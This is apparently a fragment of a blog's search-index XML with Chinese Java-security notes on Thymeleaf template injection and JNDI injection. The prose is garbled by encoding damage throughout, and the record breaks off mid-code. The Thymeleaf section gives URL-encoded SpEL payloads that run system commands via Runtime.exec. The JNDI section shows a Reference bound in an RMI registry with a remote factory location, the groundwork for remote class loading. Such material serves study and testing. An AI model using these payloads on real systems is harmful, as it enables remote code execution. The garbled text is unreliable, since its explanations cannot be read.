çš„ç‰‡æ®µï¼Œä»¥ä¾¿å¯ä»¥å°†å®ƒä»¬ä¿å­˜åœ¨å•ç‹¬çš„æ–‡ä»¶(é€šå¸¸æ˜¯.propertiesæ–‡ä»¶)ä¸­,æ–‡æœ¬çš„å¤–éƒ¨åŒ–ç‰‡æ®µé€šå¸¸ç§°ä¸ºâ€œæ¶ˆæ¯â€ã€‚é€šä¿—æ˜“æ‡‚çš„æ¥è¯´#{â€¦}<font style="color:rgb(51, 51, 51);">è¯­æ³•å°±æ˜¯ç”¨æ¥<br></font><strong>è¯»å–é…ç½®æ–‡ä»¶ä¸­æ•°æ®</strong> çš„ã€‚</p><h4 id="ç‰‡æ®µè¡¨è¾¾å¼"><a href="#ç‰‡æ®µè¡¨è¾¾å¼" class="headerlink" title="ç‰‡æ®µè¡¨è¾¾å¼"></a>ç‰‡æ®µè¡¨è¾¾å¼</h4><p>ç‰‡æ®µè¡¨è¾¾å¼~{â€¦}å¯ä»¥ç”¨äºå¼•ç”¨å…¬å…±çš„ç›®æ ‡ç‰‡æ®µï¼Œæ¯”å¦‚å¯ä»¥åœ¨ä¸€ä¸ªtemplate&#x2F;footer.htmlä¸­å®šä¹‰ä¸‹é¢çš„ç‰‡æ®µ,å¹¶åœ¨å¦ä¸€ä¸ªtemplateä¸­å¼•ç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div th:fragment=<span class="string">&quot;copy&quot;</span>&gt;</span><br><span class="line">Â© <span class="number">2011</span> The Good Thymes Virtual Grocery</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div th:insert=<span class="string">&quot;~&#123;footer :: copy&#125;&quot;</span>&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="Thymeleaf-æ¨¡æ¿æ³¨å…¥æ¼æ´"><a href="#Thymeleaf-æ¨¡æ¿æ³¨å…¥æ¼æ´" class="headerlink" title="Thymeleaf æ¨¡æ¿æ³¨å…¥æ¼æ´"></a>Thymeleaf æ¨¡æ¿æ³¨å…¥æ¼æ´</h3><p>Thymeleaf SSTI æ¼æ´é€šå¸¸å‘ç”Ÿåœ¨ä½¿ç”¨åŠ¨æ€è¾“å…¥æ¥ç”Ÿæˆ Thymeleaf æ¨¡æ¿çš„æƒ…å†µä¸‹ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒ æ„é€ çš„è¾“å…¥å‘æœåŠ¡å™¨å‘é€æ¶æ„ä»£ç ï¼Œè¿™äº›ä»£ç å°†è¢« Thymeleaf è§†ä¸ºæœ‰æ•ˆçš„æ¨¡æ¿è¡¨è¾¾å¼ï¼Œå¹¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§ è¡Œã€‚å› æ­¤ä¼šå¯¼è‡´æœåŠ¡å™¨ä¸Šçš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œä»è€Œä½¿æ”»å‡»è€…èƒ½å¤Ÿå®Œå…¨æ¥ç®¡æœåŠ¡å™¨å¹¶è®¿é—®æ•æ„Ÿæ•°æ®ã€‚åœ¨ Thymeleaf ä¸­ï¼Œå¯ä»¥ä½¿ç”¨è¡¨è¾¾å¼æ¥åŠ¨æ€è®¾ç½®æ¨¡æ¿çš„å€¼ã€‚ä¾‹å¦‚ï¼Œ ${user.name} å°†è¢«æ›¿æ¢ä¸ºç”¨æˆ·çš„å ç§°ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç±»ä¼¼${T(java.lang.Runtime).getRuntime().exec(â€˜calcâ€™)} çš„è¡¨è¾¾å¼æ¥æ‰§è¡Œ ä»»æ„çš„ç³»ç»Ÿå‘½ä»¤ã€‚Thymeleaf 3.0.0 è‡³ 3.0.11 ç‰ˆæœ¬å­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚è¯¥æ¼æ´åœ¨Thymeleaf 3.0.12åŠä»¥åç‰ˆæœ¬å·²ç»å¾—åˆ°ä¿® å¤ï¼Œä½†è¿˜æ˜¯å­˜åœ¨ä¸€äº› Bypass çš„æ–¹å¼ã€‚</p><p>å‚è€ƒï¼š<a href="https://tttang.com/archive/1412/#toc_0x03-thymeleaf">https://tttang.com/archive/1412/#toc_0x03-thymeleaf</a></p><p><a href="https://forum.butian.net/share/1661">https://forum.butian.net/share/1661</a></p><p><a href="https://www.ctfiot.com/110645.html">https://www.ctfiot.com/110645.html</a></p><p><a href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a></p><p>Thymeleafæ¨¡ç‰ˆæ³¨å…¥æ¼æ´åˆ†ä¸¤ç§åœºæ™¯ï¼ŒæŒ‰ç…§ç»Servletå¤„ç†åå¾—åˆ°çš„viewTemplateNameåŒ…å«â€<strong>::</strong>â€œå’Œä¸åŒ…å«â€<strong>::</strong>â€œä¸¤ç§æƒ…å†µã€‚</p><p>pocï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">é€‰æ‹©æ¨¡æ¿è¯­æ³•</span><br><span class="line">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;open%20-a%20calculator&quot;</span>).getInputStream()).next()%7d__::.x</span><br><span class="line"></span><br><span class="line">ç‰‡æ®µé€‰æ‹©å™¨</span><br><span class="line">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;touch /tmp/test.txt&quot;</span>).getInputStream()).next()%7d__::.x</span><br><span class="line"></span><br><span class="line">æ‹¼æ¥è·¯å¾„</span><br><span class="line">__%<span class="number">24</span>%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open -a20calculator%<span class="number">22</span>).getInputStream()).next()%7D__%3A%3A.x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jndiæ³¨å…¥</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Jndi%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Jndi%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>JNDI(Java Naming and Directory Interface)æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºè®¾è®¡çš„ APIï¼Œä¸€ç§æ ‡å‡†çš„ Java å‘½åç³»ç»Ÿæ¥å£ã€‚JNDI æä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯ APIï¼Œé€šè¿‡ä¸åŒçš„è®¿é—®æä¾›è€…æ¥å£JNDIæœåŠ¡ä¾›åº”æ¥å£(SPI)çš„å®ç°ï¼Œç”±ç®¡ç†è€…å°† JNDI API æ˜ å°„ä¸ºç‰¹å®šçš„å‘½åæœåŠ¡å’Œç›®å½•ç³»ç»Ÿï¼Œä½¿å¾— Java åº”ç”¨ç¨‹åºå¯ä»¥å’Œè¿™äº›å‘½åæœåŠ¡å’Œç›®å½•æœåŠ¡ä¹‹é—´è¿›è¡Œäº¤äº’ã€‚<br>ä¸Šé¢è¾ƒå®˜æ–¹è¯´æ³•ï¼Œé€šä¿—çš„è¯´å°±æ˜¯è‹¥ç¨‹åºå®šä¹‰äº† JDNI ä¸­çš„æ¥å£ï¼Œåˆ™å°±å¯ä»¥é€šè¿‡è¯¥æ¥å£ API è®¿é—®ç³»ç»Ÿçš„ å‘½ä»¤æœåŠ¡å’Œç›®å½•æœåŠ¡,å¦‚ä¸‹å›¾ã€‚<br><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713598679063-d9dcf269-aef0-4d13-baaa-4c233cf0c6d5.png"></p><h2 id="jndiåŒ…"><a href="#jndiåŒ…" class="headerlink" title="jndiåŒ…"></a>jndiåŒ…</h2><ul><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html">javax.naming</a>ï¼šä¸»è¦ç”¨äºå‘½åæ“ä½œï¼Œå®ƒåŒ…å«äº†å‘½åæœåŠ¡çš„ç±»å’Œæ¥å£ï¼Œè¯¥åŒ…å®šä¹‰äº†Contextæ¥å£å’ŒInitialContextç±»</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html">javax.naming.directory</a>ï¼šä¸»è¦ç”¨äºç›®å½•æ“ä½œï¼Œå®ƒå®šä¹‰äº†DirContextæ¥å£å’ŒInitialDir-Contextç±»</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html">javax.naming.event</a>ï¼šåœ¨å‘½åç›®å½•æœåŠ¡å™¨ä¸­è¯·æ±‚äº‹ä»¶é€šçŸ¥</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html">javax.naming.ldap</a>ï¼šæä¾›LDAPæœåŠ¡æ”¯æŒ</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html">javax.naming.spi</a>ï¼šå…è®¸åŠ¨æ€æ’å…¥ä¸åŒå®ç°ï¼Œä¸ºä¸åŒå‘½åç›®å½•æœåŠ¡ä¾›åº”å•†çš„å¼€å‘äººå‘˜æä¾›å¼€å‘å’Œå®ç°çš„é€”å¾„ï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºé€šè¿‡JNDIå¯ä»¥è®¿é—®ç›¸å…³æœåŠ¡</li></ul><p>æœ€é‡è¦çš„æ˜¯javax.namingåŒ…ï¼Œå®ƒåŒ…å«äº†è®¿é—®ç›®å½•æœåŠ¡æ‰€éœ€çš„ç±»å’Œæ¥å£ï¼Œæ¯”å¦‚Contextã€Bindingsã€Referencesã€lookup ç­‰ã€‚</p><h2 id="JNDIç±»"><a href="#JNDIç±»" class="headerlink" title="JNDIç±»"></a>JNDIç±»</h2><p>å¸¸è§çš„ç±»æœ‰å¦‚ä¸‹å‡ ä¸ª</p><h3 id="InitialContext"><a href="#InitialContext" class="headerlink" title="InitialContext"></a>InitialContext</h3><p>æ„é€ æ–¹æ³•å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//æ„å»ºä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ã€‚</span></span><br><span class="line"></span><br><span class="line">InitialContext()</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ„é€ ä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå¹¶é€‰æ‹©ä¸åˆå§‹åŒ–å®ƒã€‚</span></span><br><span class="line"></span><br><span class="line">InitialContext(<span class="type">boolean</span> lazy)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨æä¾›çš„ç¯å¢ƒæ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ã€‚</span></span><br><span class="line"></span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¸¸ç”¨åˆ°çš„æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ä¸ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ã€‚</span></span><br><span class="line"></span><br><span class="line">bind(Name name, Object obj)</span><br><span class="line"></span><br><span class="line"><span class="comment">//æšä¸¾åœ¨å‘½åä¸Šä¸‹æ–‡ä¸­ç»‘å®šçš„åç§°ä»¥åŠç»‘å®šåˆ°å®ƒä»¬çš„å¯¹è±¡çš„ç±»åã€‚</span></span><br><span class="line"></span><br><span class="line">list(String name)</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€ç´¢å‘½åå¯¹è±¡ã€‚</span></span><br><span class="line"></span><br><span class="line">lookup(String name)</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ï¼Œè¦†ç›–ä»»ä½•ç°æœ‰ç»‘å®šã€‚</span></span><br><span class="line"></span><br><span class="line">rebind(String name, Object obj)</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–æ¶ˆç»‘å®šå‘½åå¯¹è±¡ã€‚</span></span><br><span class="line"></span><br><span class="line">unbind(String name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>demoå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiTest</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨è¿™JDKé‡Œé¢ç»™çš„è§£é‡Šæ˜¯æ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå…¶å®é€šä¿—ç‚¹æ¥è®²å°±æ˜¯è·å–åˆå§‹ç›®å½•ç¯å¢ƒã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">initialContext.lookup(uri);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>è¯¥ç±»æ˜¯javax.namingä¸­çš„ä¸€ä¸ªç±»ï¼Œè¯¥ç±»è¡¨ç¤ºåœ¨å‘½å&#x2F;ç›®å½•ç³»ç»Ÿå¤–éƒ¨æ‰¾åˆ°çš„å¯¹è±¡çš„å¼•ç”¨ã€‚æ­¤ç±»æä¾›äº†JNDIç±»çš„å¼•ç”¨åŠŸèƒ½<br>æ„é€ æ–¹æ³•å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//ä¸ºç±»åä¸º&quot;className&quot;çš„å¯¹è±¡æ„é€ ä¸€ä¸ªæ–°çš„å¼•ç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line">Reference(String className)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸ºç±»åä¸º&quot;className&quot;çš„å¯¹è±¡å’Œåœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line">Reference(String className, RefAddr addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸ºç±»åä¸º&quot;className&quot;çš„å¯¹è±¡ï¼Œå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®ä»¥åŠå¯¹è±¡çš„åœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸ºç±»åä¸º&quot;className&quot;çš„å¯¹è±¡ä»¥åŠå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line">Reference(String className, String factory, String factoryLocation)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">å‚æ•°ï¼š</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">className è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">factory åŠ è½½çš„classä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§°</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">factoryLocation æä¾›classesæ•°æ®çš„åœ°å€å¯ä»¥æ˜¯file/ftp/httpåè®®</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¸¸ç”¨æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//å°†åœ°å€æ·»åŠ åˆ°ç´¢å¼•posnçš„åœ°å€åˆ—è¡¨ä¸­ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> posn, RefAddr addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»æ­¤å¼•ç”¨ä¸­åˆ é™¤æ‰€æœ‰åœ°å€ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€ç´¢ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚</span></span><br><span class="line"></span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(<span class="type">int</span> posn)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€ç´¢æœ¬å‚è€ƒæ–‡çŒ®ä¸­åœ°å€çš„åˆ—ä¸¾ã€‚</span></span><br><span class="line"></span><br><span class="line">Enumeration&lt;RefAddr&gt; <span class="title function_">getAll</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€ç´¢å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„ç±»åã€‚</span></span><br><span class="line"></span><br><span class="line">String <span class="title function_">getClassName</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„å·¥å‚ä½ç½®ã€‚</span></span><br><span class="line"></span><br><span class="line">String <span class="title function_">getFactoryClassLocation</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨å¯¹è±¡çš„å·¥å‚çš„ç±»åã€‚</span></span><br><span class="line"></span><br><span class="line">String <span class="title function_">getFactoryClassName</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»åœ°å€åˆ—è¡¨ä¸­åˆ é™¤ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚</span></span><br><span class="line"></span><br><span class="line">Object <span class="title function_">remove</span><span class="params">(<span class="type">int</span> posn)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ£€ç´¢æ­¤å¼•ç”¨ä¸­çš„åœ°å€æ•°ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">size</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”Ÿæˆæ­¤å¼•ç”¨çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚</span></span><br><span class="line"></span><br><span class="line">String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>demoå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiTest</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line"></span><br><span class="line">registry.bind(<span class="string">&quot;aa&quot;</span>,referenceWrapper);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨è°ƒç”¨å®ŒReferenceåˆä½¿ç”¨ReferenceWrapperå¯¹å‰é¢çš„referenceå¯¹è±¡è¿›è¡Œäº†å°è£…ï¼Œä¹‹æ‰€ä»¥è¿™ä¹ˆåšæ˜¯å› ä¸ºReferenceæ²¡æœ‰å®ç°Remoteæ¥å£ä¹Ÿæ²¡æœ‰ç»§æ‰¿UnicastRemoteObjectç±»ã€‚ï¼ˆå°†ç±»æ³¨å†Œåˆ°Registryéœ€è¦å®ç°Remoteå’Œç»§æ‰¿UnicastRemoteObjectç±»ï¼‰</p><h2 id="jndi-rmi-æ³¨å…¥"><a href="#jndi-rmi-æ³¨å…¥" class="headerlink" title="jndi + rmi æ³¨å…¥"></a>jndi + rmi æ³¨å…¥</h2><p>æœåŠ¡ç«¯è¿˜æ˜¯åˆ©ç”¨ <a href="https://www.yuque.com/zqiangweihuakai/kb/yk0fv5pk1ssnkqxr">https://www.yuque.com/zqiangweihuakai/kb/yk0fv5pk1ssnkqxr</a> æ­¤ç¯‡çš„rmiæœåŠ¡ç«¯ä»£ç <br>åˆ©ç”¨jndi è°ƒç”¨rmiæœåŠ¡ç«¯çš„æœåŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®JNDIç¯å¢ƒ</span></span><br><span class="line"></span><br><span class="line">Hashtable&lt;String, String&gt; env = 